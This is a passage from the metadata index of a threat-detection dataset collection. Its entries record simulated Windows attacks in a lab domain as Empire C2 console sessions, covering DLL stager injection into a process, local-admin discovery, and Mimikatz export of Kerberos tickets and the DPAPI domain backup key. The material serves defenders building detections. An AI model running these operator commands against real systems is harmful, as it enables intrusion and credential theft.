{}\n__SERVER         : \n__NAMESPACE      : \n__PATH           : \nProcessId        : 6952\nReturnValue      : 0\nPSComputerName   : \n\n(Empire: powershell/lateral_movement/invoke_executemsbuild) > \n(Empire: powershell/lateral_movement/invoke_executemsbuild) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nA7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \nHBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \nUF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 21:28:07  http\nAWTK7BX5 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         2228   5/0.0    2020-09-20 21:39:34  http            \nU63RL1XZ ps 172.18.39.6     WORKSTATION6      *THESHIRE\\pgustavo      powershell         3008   5/0.0    2020-09-20 21:39:35  http            \n\n(Empire: agents) > interact U63RL1XZ\n(Empire: U63RL1XZ) > shell whoami\n[*] Tasked U63RL1XZ to run TASK_SHELL\n[*] Agent U63RL1XZ tasked with task ID 1\n(Empire: U63RL1XZ) > \ntheshire\\pgustavo\n\n..Command execution completed.\n\n(Empire: U63RL1XZ) >"
        },
        "references": [
            "https://blog.f-secure.com/endpoint-detection-of-remote-service-creation-and-psexec/"
        ],
        "mp_last_updated": "2022-01-08T01:49:32.857296+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190518221344.yaml": {
        "title": "Empire Invoke DLLInjection",
        "id": "SDWIN-190518221344",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/07/22",
        "modification_date": "2020/09/21",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "DLL Injection",
            "LoadLibrary",
            "CreateRemoteThread Execution"
        ],
        "description": "This dataset represents a threat actor injecting a Dll (On Disk) into an arbitrary process via LoadLibrary and executd by CreateRemoteThread APIs",
        "attack_mappings": [
            {
                "technique": "T1055",
                "sub-technique": "001",
                "tactics": [
                    "TA0004",
                    "TA0005"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/empire_dllinjection_LoadLibrary_CreateRemoteThread.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "invoke_dllinjection",
                    "script": "https://github.com/EmpireProject/Empire/blob/dev/data/module_source/code_execution/Invoke-DllInjection.ps1"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "(Empire) > usestager windows/dll\n(Empire: stager/windows/dll) > \n(Empire: stager/windows/dll) > set Listener http\n(Empire: stager/windows/dll) > info\n\nName: DLL Launcher\n\nDescription:\n  Generate a PowerPick Reflective DLL to inject with\n  stager code.\n\nOptions:\n\n  Name             Required    Value             Description\n  ----             --------    -------           -----------\n  Listener         True        http              Listener to use.\n  Language         True        powershell        Language of the stager to generate.\n  Arch             True        x64               Architecture of the .dll to generate\n                                                (x64 or x86).\n  StagerRetries    False       0                 Times for the stager to retry\n                                                connecting.\n  UserAgent        False       default           User-agent string to use for the staging\n                                                request (default, none, or other).\n  Proxy            False       default           Proxy to use for request (default, none,\n                                                or other).\n  ProxyCreds       False       default           Proxy credentials\n                                                ([domain\\]username:password) to use for\n                                                request (default, none, or other).\n  OutFile          True        /tmp/launcher.dll File to output dll to.\n  Obfuscate        False       False             Switch. Obfuscate the launcher\n                                                powershell code, uses the\n                                                ObfuscateCommand for obfuscation types.\n                                                For powershell only.\n  ObfuscateCommand False       Token\\All\\1       The Invoke-Obfuscation command to use.\n                                                Only used if Obfuscate switch is True.\n                                                For powershell only.\n\n\n(Empire: stager/windows/dll) > execute\n\n[*] Stager output written out to: /tmp/launcher.dll\n\n(Empire: stager/windows/dll) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n712ETU3B ps 172.18.39.5     WORKSTATION5      *MORDOR\\pgustavo        powershell         9076   5/0.0    2020-07-22 03:52:58  http            \n\n(Empire: agents) > interact 712ETU3B\n(Empire: 712ETU3B) >\n(Empire: 712ETU3B) > ps\n[*] Tasked 712ETU3B to run TASK_SHELL\n[*] Agent 712ETU3B tasked with task ID 1\n(Empire: 712ETU3B) > upload /tmp/launcher.dll\n[*] Tasked agent to upload launcher.dll, 155 KB\n[*] Tasked 712ETU3B to run TASK_UPLOAD\n[*] Agent 712ETU3B tasked with task ID 2\n(Empire: 712ETU3B) >\nProcessName                                                      PID Arch UserName                     MemUsage \n-----------                                                      --- ---- --------                     -------- \nIdle                                                               0 x64  N/A                          0.01 MB  \nSystem                                                             4 x64  N/A                          0.14 MB  \nRegistry                                                          88 x64  NT AUTHORITY\\SYSTEM          59.03 MB \nsvchost                                                          396 x64  NT AUTHORITY\\SYSTEM          8.43 MB  \nsmss                                                             408 x64  NT AUTHORITY\\SYSTEM          1.10 MB  \nLogonUI                                                          456 x64  NT AUTHORITY\\SYSTEM          47.74 MB \ncsrss                                                            524 x64  NT AUTHORITY\\SYSTEM          4.66 MB  \nwininit                                                          596 x64  NT AUTHORITY\\SYSTEM          6.04 MB  \ncsrss                                                            604 x64  NT AUTHORITY\\SYSTEM          3.95 MB  \nwinlogon                                                         664 x64  NT AUTHORITY\\SYSTEM          9.32 MB  \ncsrss                                                            716 x64  NT AUTHORITY\\SYSTEM          5.08 MB  \nservices                                                         732 x64  NT AUTHORITY\\SYSTEM          12.67 MB \nlsass                                                            740 x64  NT AUTHORITY\\SYSTEM          21.21 MB \ndwm                                                              796 x64  Window Manager\\DWM-1         36.96 MB \nctfmon                                                           808 x64  MORDOR\\pgustavo              13.93 MB \nsvchost                                                          856 x64  NT AUTHORITY\\SYSTEM          3.58 MB  \nfontdrvhost                                                      880 x64  Font Driver Host\\UMFD-1      2.18 MB  \nfontdrvhost                                                      884 x64  Font Driver Host\\UMFD-0      2.22 MB  \nsvchost                                                          920 x64  NT AUTHORITY\\SYSTEM          28.34 MB \nsvchost                                                          996 x64  NT AUTHORITY\\NETWORK SERVICE 14.50 MB \nsvchost                                                         1056 x64  NT AUTHORITY\\NETWORK SERVICE 67.65 MB \nsvchost                                                         1096 x64  NT AUTHORITY\\SYSTEM          6.86 MB  \nsvchost                                                         1120 x64  NT AUTHORITY\\SYSTEM          9.29 MB  \nsvchost                                                         1164 x64  NT AUTHORITY\\LOCAL SERVICE   6.02 MB  \nsvchost                                                         1176 x64  NT AUTHORITY\\LOCAL SERVICE   6.60 MB  \nsvchost                                                         1184 x64  NT AUTHORITY\\LOCAL SERVICE   11.45 MB \nsvchost                                                         1192 x64  NT AUTHORITY\\LOCAL SERVICE   5.42 MB  \nbrowser_broker                                                  1220 x64  MORDOR\\pgustavo              10.18 MB \nbackgroundTaskHost                                              1296 x64  MORDOR\\pgustavo              16.88 MB \nsvchost                                                         1304 x64  NT AUTHORITY\\SYSTEM          14.52 MB \nsvchost                                                         1356 x64  NT AUTHORITY\\LOCAL SERVICE   6.06 MB  \nsvchost                                                         1392 x64  NT AUTHORITY\\LOCAL SERVICE   27.38 MB \nsvchost                                                         1408 x64  NT AUTHORITY\\NETWORK SERVICE 7.54 MB  \nsvchost                                                         1436 x64  NT AUTHORITY\\SYSTEM          10.04 MB \nsvchost                                                         1444 x64  NT AUTHORITY\\SYSTEM          5.67 MB  \nSecurityHealthSystray                                           1468 x64  MORDOR\\pgustavo              11.66 MB \nsvchost                                                         1488 x64  NT AUTHORITY\\SYSTEM          5.47 MB  \nsvchost                                                         1496 x64  NT AUTHORITY\\SYSTEM          6.18 MB  \nsvchost                                                         1504 x64  NT AUTHORITY\\SYSTEM          6.77 MB  \nsvchost                                                         1532 x64  NT AUTHORITY\\LOCAL SERVICE   7.59 MB  \nsvchost                                                         1544 x64  NT AUTHORITY\\LOCAL SERVICE   5.32 MB  \nsvchost                                                         1740 x64  NT AUTHORITY\\NETWORK SERVICE 11.28 MB \nsvchost                                                         1764 x64  NT AUTHORITY\\LOCAL SERVICE   16.14 MB \nsvchost                                                         1868 x64  NT AUTHORITY\\LOCAL SERVICE   17.68 MB \nVSSVC                                                           1936 x64  NT AUTHORITY\\SYSTEM          7.02 MB  \nsvchost                                                         1960 x64  NT AUTHORITY\\SYSTEM          13.24 MB \nsvchost                                                         1968 x64  NT AUTHORITY\\LOCAL SERVICE   7.03 MB  \nsvchost                                                         1980 x64  NT AUTHORITY\\SYSTEM          47.10 MB \nsvchost                                                         1992 x64  NT AUTHORITY\\SYSTEM          5.35 MB  \nRuntimeBroker                                                   2068 x64  MORDOR\\pgustavo              21.71 MB \nMemory Compression                                              2104 x64  NT AUTHORITY\\SYSTEM          98.54 MB \nsvchost                                                         2188 x64  NT AUTHORITY\\SYSTEM          9.24 MB  \nbackgroundTaskHost                                              2196 x64  MORDOR\\pgustavo              38.76 MB \nsvchost                                                         2208 x64  NT AUTHORITY\\SYSTEM          7.00 MB  \nSgrmBroker                                                      2252 x64  NT AUTHORITY\\SYSTEM          5.88 MB  \nspoolsv                                                         2260 x64  NT AUTHORITY\\SYSTEM          14.19 MB \nsvchost                                                         2264 x64  NT AUTHORITY\\SYSTEM          9.81 MB  \nsvchost                                                         2296 x64  NT AUTHORITY\\SYSTEM          7.45 MB  \nsvchost                                                         2316 x64  NT AUTHORITY\\LOCAL SERVICE   7.14 MB  \nsvchost                                                         2372 x64  NT AUTHORITY\\SYSTEM          6.17 MB  \nsvchost                                                         2484 x64  NT AUTHORITY\\LOCAL SERVICE   6.16 MB  \nRuntimeBroker                                                   2540 x64  MORDOR\\pgustavo              28.75 MB \nsvchost                                                         2548 x64  NT AUTHORITY\\LOCAL SERVICE   6.89 MB  \nsmartscreen                                                     2568 x64  MORDOR\\pgustavo              27.85 MB \nsvchost                                                         2592 x64  NT AUTHORITY\\SYSTEM          19.99 MB \nsvchost                                                         2608 x64  NT AUTHORITY\\NETWORK SERVICE 8.35 MB  \nsvchost                                                         2644 x64  NT AUTHORITY\\SYSTEM          10.73 MB \nsvchost                                                         2676 x64  NT AUTHORITY\\LOCAL SERVICE   13.55 MB \nWaSecAgentProv                                                  2760 x64  NT AUTHORITY\\SYSTEM          5.63 MB  \nsvchost                                                         2776 x64  NT AUTHORITY\\SYSTEM          9.90 MB  \nsvchost                                                         2812 x64  NT AUTHORITY\\LOCAL SERVICE   5.57 MB  \nsvchost                                                         2820 x64  NT AUTHORITY\\SYSTEM          11.99 MB \nsvchost                                                         2828 x64  NT AUTHORITY\\LOCAL SERVICE   8.51 MB  \nsvchost                                                         2920 x64  NT AUTHORITY\\SYSTEM          11.50 MB \nsihost                                                          3104 x64  MORDOR\\pgustavo              27.69 MB \nsvchost                                                         3256 x64  NT AUTHORITY\\NETWORK SERVICE 12.81 MB \nsvchost                                                         3268 x64  NT AUTHORITY\\SYSTEM          24.27 MB \nsvchost                                                         3284 x64  NT AUTHORITY\\LOCAL SERVICE   33.89 MB \nsvchost                                                         3344 x64  NT AUTHORITY\\SYSTEM          5.10 MB  \nsvchost                                                         3372 x64  NT AUTHORITY\\LOCAL SERVICE   6.68 MB  \nShellExperienceHost                                             3384 x64  MORDOR\\pgustavo              50.26 MB \nsvchost                                                         3440 x64  NT AUTHORITY\\SYSTEM          15.84 MB \nWindowsAzureGuestAgent                                          3468 x64  NT AUTHORITY\\SYSTEM          59.33 MB \nWaAppAgent                                                      3476 x64  NT AUTHORITY\\SYSTEM          73.09 MB \nWindowsAzureNetAgent                                            3544 x64  NT AUTHORITY\\SYSTEM          7.45 MB  \nsvchost                                                         3564 x64  NT AUTHORITY\\LOCAL SERVICE   4.78 MB  \nNetworkWatcherAgent                                             3580 x64  NT AUTHORITY\\SYSTEM          12.99 MB \nsvchost                                                         3624 x64  NT AUTHORITY\\SYSTEM          8.15 MB  \nsvchost                                                         3648 x64  NT AUTHORITY\\SYSTEM          12.23 MB \nsvchost                                                         4240 x64  NT AUTHORITY\\SYSTEM          19.69 MB \nWUDFHost                                                        4276 x64  NT AUTHORITY\\LOCAL SERVICE   29.04 MB \nSearchIndexer                                                   4296 x64  NT AUTHORITY\\SYSTEM          33.70 MB \nconhost                                                         4304 x64  MORDOR\\pgustavo              15.58 MB \ntaskhostw                                                       4432 x64  NT AUTHORITY\\SYSTEM          36.85 MB \nsvchost                                                         4440 x64  NT AUTHORITY\\SYSTEM          9.48 MB  \nsvchost                                                         4616 x64  MORDOR\\pgustavo              16.36 MB \nsvchost                                                         4628 x64  NT AUTHORITY\\SYSTEM          8.93 MB  \nsvchost                                                         4640 x64  NT AUTHORITY\\SYSTEM          19.45 MB \nsvchost                                                         4796 x64  NT AUTHORITY\\LOCAL SERVICE   9.97 MB  \nconhost                                                         4856 x64  MORDOR\\pgustavo              15.93 MB \nsvchost                                                         4900 x64  NT AUTHORITY\\SYSTEM          7.45 MB  \nStartMenuExperienceHost                                         5024 x64  MORDOR\\pgustavo              61.98 MB \nsvchost                                                         5064 x64  NT AUTHORITY\\LOCAL SERVICE   9.70 MB  \nsvchost                                                         5080 x64  NT AUTHORITY\\SYSTEM          7.20 MB  \nsvchost                                                         5148 x64  NT AUTHORITY\\NETWORK SERVICE 18.23 MB \nsvchost                                                         5464 x64  MORDOR\\pgustavo              21.27 MB \nMicrosoftEdge                                                   5516 x64  MORDOR\\pgustavo              65.12 MB \nsvchost                                                         5524 x64  NT AUTHORITY\\LOCAL SERVICE   6.69 MB  \nsvchost                                                         5548 x64  NT AUTHORITY\\SYSTEM          18.43 MB \nRuntimeBroker                                                   5596 x64  MORDOR\\pgustavo              48.75 MB \nsvchost                                                         5640 x64  NT AUTHORITY\\SYSTEM          6.71 MB  \nsvchost                                                         5648 x64  NT AUTHORITY\\SYSTEM          8.14 MB  \nsvchost                                                         5704 x64  NT AUTHORITY\\SYSTEM          5.90 MB  \nsvchost                                                         5812 x64  NT AUTHORITY\\LOCAL SERVICE   6.93 MB  \ndllhost                                                         5976 x64  MORDOR\\pgustavo              15.26 MB \nsvchost                                                         6008 x64  NT AUTHORITY\\LOCAL SERVICE   8.91 MB  \nsvchost                                                         6036 x64  NT AUTHORITY\\LOCAL SERVICE   6.32 MB  \nsvchost                                                         6072 x64  MORDOR\\pgustavo              33.20 MB \nRuntimeBroker                                                   6152 x64  MORDOR\\pgustavo              24.96 MB \nTrustedInstaller                                                6280 x64  NT AUTHORITY\\SYSTEM          6.59 MB  \nsvchost                                                         6368 x64  NT AUTHORITY\\SYSTEM          9.77 MB  \nsvchost                                                         6488 x64  NT AUTHORITY\\SYSTEM          11.64 MB \nnotepad                                                         6536 x64  MORDOR\\pgustavo              15.43 MB \nSecurityHealthHost                                              6540 x64  MORDOR\\pgustavo              15.52 MB \nfontdrvhost                                                     6652 x64  Font Driver Host\\UMFD-3      6.01 MB  \nWindowsInternal.ComposableShell.Experiences.TextInput.InputApp  6680 x64  MORDOR\\pgustavo              34.32 MB \nMicrosoftEdgeCP                                                 6744 x64  MORDOR\\pgustavo              51.89 MB \nWmiPrvSE                                                        6904 x64  NT AUTHORITY\\NETWORK SERVICE 10.39 MB \nMicrosoft.Photos                                                7044 x64  MORDOR\\pgustavo              34.66 MB \ndllhost                                                         7084 x64  MORDOR\\pgustavo              7.86 MB  \nconhost                                                         7136 x64  NT AUTHORITY\\SYSTEM          5.40 MB  \ndwm                                                             7348 x64  Window Manager\\DWM-3         83.22 MB \nRuntimeBroker                                                   7468 x64  MORDOR\\pgustavo              24.92 MB \nWindows.WARP.JITService                                         7620 x64  NT AUTHORITY\\LOCAL SERVICE   5.05 MB  \nwinlogon                                                        8012 x64  NT AUTHORITY\\SYSTEM          8.22 MB  \nMsMpEng                                                         8272 x64  NT AUTHORITY\\SYSTEM          102.83 MB\nsvchost                                                         8328 x64  NT AUTHORITY\\LOCAL SERVICE   8.31 MB  \nRuntimeBroker                                                   8392 x64  MORDOR\\pgustavo              20.96 MB \nsvchost                                                         8408 x64  MORDOR\\pgustavo              30.12 MB \nWindows.WARP.JITService                                         8416 x64  NT AUTHORITY\\LOCAL SERVICE   5.21 MB  \nsvchost                                                         8480 x64  NT AUTHORITY\\SYSTEM          5.68 MB  \nApplicationFrameHost                                            8484 x64  MORDOR\\pgustavo              28.34 MB \nexplorer                                                        8532 x64  MORDOR\\pgustavo              117.59 MB\nWUDFHost                                                        8600 x64  NT AUTHORITY\\LOCAL SERVICE   4.83 MB  \npowershell                                                      8648 x64  MORDOR\\pgustavo              73.75 MB \nMicrosoftEdgeSH                                                 8880 x64  MORDOR\\pgustavo              15.34 MB \npowershell                                                      9076 x64  MORDOR\\pgustavo              121.03 MB\nrdpclip                                                         9128 x64  MORDOR\\pgustavo              10.55 MB \ntaskhostw                                                       9236 x64  MORDOR\\pgustavo              16.99 MB \nSearchUI                                                        9328 x64  MORDOR\\pgustavo              211.37 MB\nSysmon                                                          9368 x64  NT AUTHORITY\\SYSTEM          17.81 MB \nsvchost                                                         9560 x64  NT AUTHORITY\\SYSTEM          10.84 MB \nSecurityHealthService                                           9640 x64  NT AUTHORITY\\SYSTEM          16.16 MB \nRuntimeBroker                                                   9768 x64  MORDOR\\pgustavo              30.12 MB \nsvchost                                                         9860 x64  NT AUTHORITY\\SYSTEM          5.57 MB  \nunsecapp                                                        9996 x64  NT AUTHORITY\\SYSTEM          6.41 MB  \nTiWorker                                                       10084 x64  NT AUTHORITY\\SYSTEM          27.34 MB \nsvchost                                                        10164 x64  NT AUTHORITY\\SYSTEM          10.19 MB\n\n(Empire: 712ETU3B) > usemodule code_execution/invoke_dllinjection\n(Empire: powershell/code_execution/invoke_dllinjection) > set Dll launcher.dll \n(Empire: powershell/code_execution/invoke_dllinjection) > set ProcessID 6536\n(Empire: powershell/code_execution/invoke_dllinjection) > info\n\n              Name: Invoke-DllInjection\n            Module: powershell/code_execution/invoke_dllinjection\n        NeedsAdmin: False\n        OpsecSafe: True\n          Language: powershell\nMinLanguageVersion: 2\n        Background: False\n  OutputExtension: None\n\nAuthors:\n  @mattifestation\n\nDescription:\n  Uses PowerSploit's Invoke-DLLInjection to inject  a Dll into\n  the process ID of your choosing.\n\nComments:\n  https://github.com/mattifestation/PowerSploit/blob/master/Co\n  deExecution/Invoke-DllInjection.ps1\n\nOptions:\n\n  Name      Required    Value                     Description\n  ----      --------    -------                   -----------\n  Agent     True        712ETU3B                  Agent to run module on.                 \n  ProcessID True        6536                      Process ID of the process you want to   \n                                                  inject a Dll into.                      \n  Dll       True        launcher.dll              Name of the dll to inject. This can be  \n                                                  an absolute or relative path.           \n\n(Empire: powershell/code_execution/invoke_dllinjection) > execute\n[*] Tasked 712ETU3B to run TASK_CMD_WAIT\n[*] Agent 712ETU3B tasked with task ID 6\n[*] Tasked agent 712ETU3B to run module powershell/code_execution/invoke_dllinjection\n(Empire: powershell/code_execution/invoke_dllinjection) > \nSystem.Diagnostics.ProcessModule (launcher.dll)\n\n(Empire: powershell/code_execution/invoke_dllinjection) >"
        },
        "references": [
            "https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process"
        ],
        "mp_last_updated": "2022-01-08T01:49:33.048296+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190518224039.yaml": {
        "title": "Empire Find Local Admin Access",
        "id": "SDWIN-190518224039",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/05/18",
        "modification_date": "2019/05/18",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "RPC OpenSCManager",
            "SMB Svcctl"
        ],
        "description": "This dataset represents adversaries using the OpenSCManagerW Win32API call to establish a handle to the remote host and verify if the current user context has local administrator acess to the target.",
        "attack_mappings": [
            {
                "technique": "T1069",
                "sub-technique": "001",
                "tactics": [
                    "TA0007"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/discovery/host/empire_find_localadmin_smb_svcctl_OpenSCManager.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "find_localadmin_access",
                    "script": "https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/situational_awareness/network/powerview/find_localadmin_access.py"
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "(Empire: GCSKD17Z) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nGCSKD17Z ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         1112   5/0.0    2020-09-22 06:15:19  http            \n\n(Empire: agents) > interact GCSKD17Z\n(Empire: GCSKD17Z) > usemodule situational_awareness/network/powerview/find_localadmin_access\n(Empire: powershell/situational_awareness/network/powerview/find_localadmin_access) > execute\n[*] Tasked GCSKD17Z to run TASK_CMD_JOB\n[*] Agent GCSKD17Z tasked with task ID 8\n[*] Tasked agent GCSKD17Z to run module powershell/situational_awareness/network/powerview/find_localadmin_access\n(Empire: powershell/situational_awareness/network/powerview/find_localadmin_access) > \nJob started: GL5DUX\n\n(Empire: powershell/situational_awareness/network/powerview/find_localadmin_access) > back\n(Empire: GCSKD17Z) > \nWORKSTATION5.theshire.local\nWORKSTATION6.theshire.local\nMORDORDC.theshire.local\nWEC.theshire.local\n\nFind-LocalAdminAccess completed!\n\n(Empire: GCSKD17Z) >"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:33.250296+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190518230752.yaml": {
        "title": "Empire Mimikatz Extract Kerberos Keys",
        "id": "SDWIN-190518230752",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/05/18",
        "modification_date": "2019/09/21",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "Kerberos Tickets"
        ],
        "description": "This dataset represents adversaries extracting kerberos tickets from memory.",
        "attack_mappings": [
            {
                "technique": "T1003",
                "sub-technique": "004",
                "tactics": [
                    "TA0006"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_mimikatz_extract_keys.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "extract_tickets",
                    "script": "https://github.com/OTRF/Blacksmith/blob/master/aws/Security-Datasets/cfn-files/scripts/Invoke-Mimikatz.ps1"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "(Empire: stager/multi/launcher) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nWE8XYD3K ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5972   5/0.0    2020-09-22 07:35:29  http            \n\n(Empire: agents) > interact WE8XYD3K\n(Empire: WE8XYD3K) > usemodule credentials/mimikatz/extract_tickets\n(Empire: powershell/credentials/mimikatz/extract_tickets) > info\n\n              Name: Invoke-Mimikatz extract kerberos tickets.\n            Module: powershell/credentials/mimikatz/extract_tickets\n        NeedsAdmin: False\n        OpsecSafe: True\n          Language: powershell\nMinLanguageVersion: 2\n        Background: True\n  OutputExtension: None\n\nAuthors:\n  @JosephBialek\n  @gentilkiwi\n\nDescription:\n  Runs PowerSploit's Invoke-Mimikatz function to extract\n  kerberos tickets from memory in base64-encoded form.\n\nComments:\n  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com\n\nOptions:\n\n  Name  Required    Value                     Description\n  ----  --------    -------                   -----------\n  Agent True        WE8XYD3K                  Agent to run module on.                 \n\n(Empire: powershell/credentials/mimikatz/extract_tickets) > execute\n[*] Tasked WE8XYD3K to run TASK_CMD_JOB\n[*] Agent WE8XYD3K tasked with task ID 1\n[*] Tasked agent WE8XYD3K to run module powershell/credentials/mimikatz/extract_tickets\n(Empire: powershell/credentials/mimikatz/extract_tickets) > \nJob started: PY68ZG\n\nHostname: WORKSTATION5.theshire.local / S-1-5-21-4228717743-1032521047-1810997296\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2020 20:07:46\n.## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz(powershell) # standard::base64\nisBase64InterceptInput  is false\nisBase64InterceptOutput is false\n\nmimikatz(powershell) # kerberos::list /export\n\n[00000000] - 0x00000012 - aes256_hmac      \n  Start/End/MaxRenew: 9/22/2020 3:31:24 AM ; 9/22/2020 1:31:24 PM ; 9/29/2020 3:31:24 AM\n  Server Name       : krbtgt/THESHIRE.LOCAL @ THESHIRE.LOCAL\n  Client Name       : pgustavo @ THESHIRE.LOCAL\n  Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; \n  * Saved to file     : 0-40e10000-pgustavo@krbtgt~THESHIRE.LOCAL-THESHIRE.LOCAL.kirbi\n\n(Empire: powershell/credentials/mimikatz/extract_tickets) >"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:33.452298+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190518235535.yaml": {
        "title": "Empire Mimikatz Backup Keys",
        "id": "SDWIN-190518235535",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/05/18",
        "modification_date": "2020/09/21",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "DPAPI",
            "DPAPI Domain Backup key",
            "RPC LSARPC"
        ],
        "description": "This dataset represents adversaries retrieving the DPAPI Domain Backup Key from the DC via RPC LSARPC methods over SMB.",
        "attack_mappings": [
            {
                "technique": "T1003",
                "sub-technique": null,
                "tactics": [
                    "TA0006"
                ]
            }
        ],
        "notebooks": [
            {
                "project": "Threat Hunter Playbook",
                "name": "Domain DPAPI Backup Key Extraction",
                "link": "https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-190620024610.html"
            }
        ],
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_mimikatz_backupkeys_dcerpc_smb_lsarpc.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/network/empire_mimikatz_backupkeys_dcerpc_smb_lsarpc.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "mimikatz_lsadump_backupkeys",
                    "script": "https://github.com/OTRF/Blacksmith/blob/master/aws/Security-Datasets/cfn-files/scripts/Invoke-Mimikatz.ps1"
                }
            ],
            "permissions_required": [
                "Domain Admin"
            ],
            "adversary_view": "(Empire: stager/multi/launcher) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nALYH6ZB2 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         4380   5/0.0    2020-10-22 18:24:28  http            \n\n(Empire: agents) > interact ALYH6ZB2\n(Empire: ALYH6ZB2) > usemodule credentials/mimikatz/\ncache*           command          dcsync_hashdump  golden_ticket    logonpasswords*  mimitokens*      purge            silver_ticket    \ncerts*           dcsync           extract_tickets  keys*            lsadump*         pth*             sam*             trust_keys*      \n(Empire: ALYH6ZB2) > usemodule credentials/mimikatz/command\n(Empire: powershell/credentials/mimikatz/command) > set Command lsadump::backupkeys /system:MORDORDC.theshire.local /export\n(Empire: powershell/credentials/mimikatz/command) > execute\n[*] Tasked ALYH6ZB2 to run TASK_CMD_JOB\n[*] Agent ALYH6ZB2 tasked with task ID 1\n[*] Tasked agent ALYH6ZB2 to run module powershell/credentials/mimikatz/command\n(Empire: powershell/credentials/mimikatz/command) > \nJob started: 75WB4S\n\nHostname: WORKSTATION5.theshire.local / S-1-5-21-2323213074-4052461197-1785501644\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Oct  4 2020 10:28:51\n.## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz(powershell) # lsadump::backupkeys /system:MORDORDC.theshire.local /export\n\nCurrent prefered key:       {a0feda20-878f-4e68-ba74-d4df8f0191ab}\n  * RSA key\n        |Provider name : Microsoft Strong Cryptographic Provider\n        |Unique name   : \n        |Implementation: CRYPT_IMPL_SOFTWARE ; \n        Algorithm      : CALG_RSA_KEYX\n        Key size       : 2048 (0x00000800)\n        Key permissions: 0000003f ( 